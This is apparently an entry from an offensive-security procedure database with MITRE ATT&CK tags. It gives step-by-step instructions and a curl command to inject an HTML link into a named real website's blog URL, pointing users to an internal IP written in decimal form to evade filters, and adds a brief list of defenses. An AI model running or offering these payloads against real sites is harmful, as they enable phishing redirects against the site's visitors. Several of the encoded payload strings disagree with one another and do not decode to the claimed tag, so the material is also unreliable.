---
tags:
  - html-injection
  - url-encoding
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-fetch-vulnerable-url]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 80e9f5e3-90a2-4303-a144-d25b074d7e63
created_at: '2025-12-14T03:47:18.164Z'
updated_at: '2025-12-14T03:47:18.164Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-URL-for-HTML-Injection

## Summary

This procedure involves crafting a URL-encoded payload to inject arbitrary HTML tags, such as anchor links, into the query parameter of the nordvpn.com/blog endpoint, enabling redirects to external or local domains like 192.168.1.1.

## Description

The nordvpn.com/blog endpoint suffers from insufficient input sanitization in its URL parameter, allowing attackers to inject HTML via URL encoding. By encoding a partial HTML tag like `<a href=`, the payload breaks out of any expected context and inserts a functional link. This can trick users into clicking redirects to phishing sites or internal networks. The attack requires no authentication and works over HTTPS, potentially evading basic filters. Prerequisites include basic knowledge of URL encoding and access to a web browser or curl.

## Requirements

1. Internet access to nordvpn.com
2. Web browser or curl for testing
3. Understanding of URL encoding (e.g., %25 for %, %3C for <)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and HTML escaping on all query parameters using libraries like OWASP ESAPI.
- Deploy Content Security Policy (CSP) to block inline scripts and unauthorized redirects.
- Monitor server logs for anomalous query strings containing encoded HTML tags.
- Use WAF rules to detect and block payloads with % encodings of <, >, or script tags.

## Objectives

1. Inject functional HTML to alter page behavior and redirect users.
2. Demonstrate vulnerability for reporting or ethical disclosure.
3. Assess potential for chaining to XSS if filters are weak.

## Instructions

### Step 1: Encode the HTML Payload

**Context**: Create a URL-encoded string that injects an <a> tag pointing to a target domain, using decimal IP (3232235777 for 192.168.1.1) to bypass filters.

**Command** ([[commands/curl-fetch-vulnerable-url]]):
```bash
# No direct command for encoding; use online encoder or manual: %25%32%32%33%65%33%63%32%66%36%31%13%33%63%36%31%30%63href%33%64%32%32http://3232235777
```

> Manually construct or use a tool like Burp Suite to URL-encode `<a href="http://3232235777">` into the parameter, resulting in `?1%25%32%32%33%65%33%63%32%66%25%36%31%25%13%25%33%63%25%36%31%25%30%63href%25%33%64%25%32%32http://3232235777`.

### Step 2: Access the Vulnerable Endpoint

**Context**: Append the encoded payload to the base URL and fetch the page to trigger the injection.

**Command** ([[commands/curl-fetch-vulnerable-url]]):
```bash
curl -s "https://nordvpn.com/blog/?1%25%32%25%32%25%33%65%25%33%63%25%32%66%25%36%31%25%13%25%33%63%25%36%31%25%30%63href%25%33%64%25%32%32http://3232235777" -o response.html
```

> This fetches the page with the injected HTML. Open response.html in a browser to see the effect, or pipe to grep for verification.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-fetch-vulnerable-url]]

## Tools Used

- None

## Tags

- [[html-injection]]
- [[url-encoding]]
- [[web-vulnerability]]
